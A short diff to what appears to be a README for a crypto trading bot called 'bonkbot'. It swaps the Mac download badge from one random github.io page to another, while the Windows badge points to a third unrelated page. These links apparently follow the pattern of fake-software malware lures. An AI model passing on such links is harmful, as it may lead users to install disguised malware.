@@ -18,7 +18,7 @@
 <div align="center">  
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://bonkbot-trading.github.io/.github/)
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/bonkbot)    
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://akffjfhha485876.github.io/.github/bonkbot)    
 
 </div>  
 
